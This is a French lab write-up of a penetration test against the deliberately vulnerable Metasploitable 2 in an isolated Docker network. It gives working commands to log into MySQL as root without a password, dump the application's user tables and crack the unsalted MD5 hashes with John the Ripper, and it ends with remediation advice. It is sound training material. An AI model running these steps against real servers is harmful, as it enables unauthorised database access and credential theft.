# Exploit #7 — MySQL : Default Credentials + Hash Cracking

## Informations

| Champ | Valeur |
|---|---|
| Date | 2026-05-07 |
| Cible | Metasploitable 2 (192.168.100.2) |
| Attaquant | Kali Linux (192.168.100.3) |
| Port | 3306 |
| Outil | mysql client + john |

## Description

MySQL sur Metasploitable 2 est configuré avec l'utilisateur `root` sans
mot de passe. Une fois connecté, un attaquant a accès à toutes les bases
de données, y compris les credentials des applications hébergées.

Les mots de passe stockés en MD5 sans sel sont cassables instantanément
avec une wordlist comme rockyou.txt.

## Chaîne d'attaque

```
MySQL root sans password
        ↓
accès toutes les bases de données
        ↓
dump des hashes MD5 sans sel
        ↓
crack instantané avec rockyou.txt
        ↓
credentials en clair de toute l'application
```

## Environnement

- **Attaquant** : Kali Linux (Docker) — 192.168.100.3
- **Cible** : Metasploitable 2 (Docker) — 192.168.100.2
- **Réseau** : Docker bridge isolé (labnet 192.168.100.0/24)
- **Outils** : mariadb-client, john

## Étapes

### 1. Vérification du port

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.100.2
set PORTS 3306
run
```

Résultat :
```
[+] 192.168.100.2 - 192.168.100.2:3306 - TCP OPEN
```

### 2. Connexion directe en root sans password

> Note : Le module Metasploit `mysql_udf_payload` échoue sur MySQL 5.0.51a
> à cause d'une incompatibilité de protocole TLS. On passe par le client
> MySQL directement avec `--ssl=0`.

```bash
mysql -h 192.168.100.2 -u root --password="" --ssl=0 -e "select version();"
```

Résultat :
```
+------------------+
| version()        |
+------------------+
| 5.0.51a-3ubuntu5 |
+------------------+
```

Connexion réussie — root sans mot de passe confirmé.

### 3. Énumération des bases de données

```bash
mysql -h 192.168.100.2 -u root --password="" --ssl=0 -e "show databases;"
```

Résultat :
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dvwa               |
| metasploit         |
| mysql              |
| owasp10            |
| tikiwiki           |
| tikiwiki195        |
+--------------------+
```

### 4. Dump des utilisateurs MySQL

```bash
mysql -h 192.168.100.2 -u root --password="" --ssl=0 \
  -e "select user,password from mysql.user;"
```

Résultat :
```
+------------------+----------+
| user             | password |
+------------------+----------+
| debian-sys-maint |          |
| root             |          |
| guest            |          |
+------------------+----------+
```

Trois utilisateurs MySQL, aucun avec mot de passe.

### 5. Dump des credentials de l'application DVWA

```bash
mysql -h 192.168.100.2 -u root --password="" --ssl=0 \
  -e "select user,password from dvwa.users;"
```

Résultat :
```
+---------+----------------------------------+
| user    | password                         |
+---------+----------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99 |
+---------+----------------------------------+
```

### 6. Crack des hashes MD5 avec John the Ripper

Création du fichier de hashes :

```bash
cat > /tmp/hashes.txt << EOF
admin:5f4dcc3b5aa765d61d8327deb882cf99
gordonb:e99a18c428cb38d5f260853678922e03
1337:8d3533d75ae2c3966d7e0d4fcc69216b
pablo:0d107d09f5bbe40cade3de5c71e9e9b7
smithy:5f4dcc3b5aa765d61d8327deb882cf99
EOF
```

Crack avec rockyou.txt :

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt
john --show --format=raw-md5 /tmp/hashes.txt
```

Résultat :
```
admin:password
gordonb:abc123
1337:charley
pablo:letmein
smithy:password

5 password hashes cracked, 0 left
```

**5/5 crackés en quelques secondes.**

## Résultats

| User | Hash MD5 | Password |
|---|---|---|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

## Pourquoi MD5 sans sel est cassé

MD5 est une fonction de hachage rapide — c'est son problème. Une carte
graphique moderne calcule plusieurs milliards de hashes MD5 par seconde.

Sans sel (salt), deux utilisateurs avec le même mot de passe ont le même
hash — `admin` et `smithy` ont tous les deux `5f4dcc3b5aa765d61d8327deb882cf99`.
Casser un hash casse automatiquement tous les comptes avec ce mot de passe.

rockyou.txt contient 14 millions de mots de passe réels issus de fuites —
des mots de passe comme `password`, `abc123`, `letmein` y figurent en
première page.

Les algorithmes corrects pour stocker des mots de passe : **bcrypt**,
**argon2**, **scrypt** — lents par conception, avec sel intégré.

## Leçons apprises

- MySQL root sans mot de passe est une misconfiguration critique
- Ne jamais exposer MySQL sur le réseau sans authentification forte
- MD5 et SHA1 sont interdits pour le stockage de mots de passe
- Toujours utiliser un sel unique par utilisateur
- Les credentials trouvés (`admin:password`) sont réutilisables sur DVWA

## Références

- https://nvd.nist.gov/vuln/detail/CVE-1999-0502
- https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html
- https://www.openwall.com/john/
